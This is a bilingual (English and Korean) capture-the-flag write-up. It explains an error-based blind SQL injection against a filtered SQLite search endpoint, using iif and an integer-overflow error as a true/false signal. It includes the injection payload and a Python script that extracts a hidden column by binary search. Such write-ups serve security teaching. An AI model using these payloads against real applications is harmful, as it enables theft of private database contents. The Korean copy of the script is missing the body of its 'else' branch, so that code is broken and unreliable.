Super Blind

AUTHOR Abdullah Hamdan

The catalog search looks harmless, and a filter is watching your input. Some record fields are private. Can you try leaking them?

Write Up

Starting from the Challenge

The challenge provides the line 'Some record fields are private. Can you try leaking them?' and a catalog search box. The search term is sent through GET /search?q=. I compared normal searches with error responses to determine whether the input entered a database query.

1. A quote changes the search result

q=a returned search results, while a string that did not exist returned No matching records.. Entering a single quote produced The search could not be completed.. The input was affecting SQL syntax.

SELECT, UNION, OR, AND, and comments were blocked by the filter, but SQLite's iif, substr, unicode, length, and abs, along with the string concatenation operator ||, were available.

2. Turning the search error into a Boolean signal

The private field never appears in the search results. SQLite's abs(-9223372036854775808) raises an integer-overflow error, which gives us a second observable page state.

Q: How can one error reveal whether a condition about the hidden value is true?

I placed the overflow inside iif so it runs only when the tested condition is true.

'||iif(
    iif(name='archive', CONDITION, 0),
    abs(-9223372036854775808),
    ''
)||'

When CONDITION is true, the search fails; when it is false, normal search results appear. The search results include a row named archive. To look for a hidden column, I used column-name candidates in length(candidate)<0: an existing text column makes the condition false, while an unknown name causes a SQL error. This led to secret. Testing substr(secret,1,5)='InIt{' for each row then identified archive as the row containing the flag.

3. Recovering one character at a time

I first determined the string length with length(secret). At each position, I compared the character code with the following condition.

unicode(substr(secret, POSITION, 1)) > MID

Each true or false response halves the range of possible character codes, so one character can be recovered in about seven requests.

The code uses requests; set BASE to the challenge URL.

# solve.py — written for this write-up
def oracle(condition):
    payload = (
        f"'||iif(iif(name='archive',{condition},0),"
        "abs(-9223372036854775808),'')||'"
    )
    page = requests.get(BASE + "/search", params={"q": payload}).text
    return "The search could not be completed" in page

def binary_value(expression, low=32, high=127):
    while low < high:
        mid = (low + high) // 2
        if oracle(f"{expression}>{mid}"):
            low = mid + 1
        else:
            high = mid
    return low

length = binary_value("length(secret)", 0, 128)
flag = "".join(
    chr(binary_value(f"unicode(substr(secret,{pos},1))"))
    for pos in range(1, length + 1)
)
print(flag)

I recovered all 37 characters in order using the same method.

문제에서 출발하기

문제에는 'Some record fields are private. Can you try leaking them?'라는 문구와 catalog 검색창이 주어진다. 검색어는 GET /search?q=로 전달된다. 정상 검색과 오류 응답을 비교해 입력값이 데이터베이스 쿼리에 들어가는지 확인했다.

1. 작은따옴표를 넣자 검색 오류가 났다

q=a는 검색 결과를 반환하고, 존재하지 않는 문자열은 No matching records.를 반환했다. 작은따옴표 하나를 입력하면 The search could not be completed.가 나타났다. 입력값이 SQL 문법에 영향을 주고 있었다.

SELECT, UNION, OR, AND와 주석은 필터에 차단됐지만 SQLite의 iif, substr, unicode, length, abs와 문자열 연결 연산자 ||는 사용할 수 있었다.

2. 검색 오류를 참·거짓 신호로 만들기

비공개 필드는 검색 결과에 표시되지 않는다. SQLite의 abs(-9223372036854775808)은 정수 overflow를 일으키므로, 화면에서 구별할 수 있는 두 번째 상태가 생긴다.

Q: 오류 하나로 숨은 값에 대한 조건이 참인지 어떻게 알아낼까?

검사할 조건이 참일 때만 overflow가 발생하도록 iif 안에 넣었다.

'||iif(
    iif(name='archive', CONDITION, 0),
    abs(-9223372036854775808),
    ''
)||'

CONDITION이 참이면 검색 오류가 발생하고, 거짓이면 정상 검색 결과가 나온다. 검색 결과에는 archive라는 행이 있다. 숨겨진 열은 length(candidate)<0에 열 이름 후보를 넣어 찾았다. 존재하는 문자열 열이면 조건이 거짓이 되고, 없는 이름이면 SQL 오류가 난다. 이 방식으로 secret을 찾은 뒤 각 행에서 substr(secret,1,5)='InIt{'를 검사하자 archive가 플래그를 가진 행으로 확인됐다.

3. 이진 탐색으로 한 글자씩 복구하기

먼저 length(secret)으로 문자열 길이를 구했다. 각 위치에서는 다음 조건으로 문자 코드를 비교했다.

unicode(substr(secret, POSITION, 1)) > MID

참과 거짓에 따라 문자 코드의 범위를 절반씩 줄이면 한 글자를 약 7번의 요청으로 찾을 수 있다.

코드는 requests를 사용하며, BASE에는 문제 주소를 넣는다.

# solve.py — written for this write-up
def oracle(condition):
    payload = (
        f"'||iif(iif(name='archive',{condition},0),"
        "abs(-9223372036854775808),'')||'"
    )
    page = requests.get(BASE + "/search", params={"q": payload}).text
    return "The search could not be completed" in page

def binary_value(expression, low=32, high=127):
    while low < high:
        mid = (low + high) // 2
        if oracle(f"{expression}>{mid}"):
            low = mid + 1
        else:

    return low

length = binary_value("length(secret)", 0, 128)
flag = "".join(
    chr(binary_value(f"unicode(substr(secret,{pos},1))"))
    for pos in range(1, length + 1)
)
print(flag)

같은 방식으로 37글자를 순서대로 복구했다.
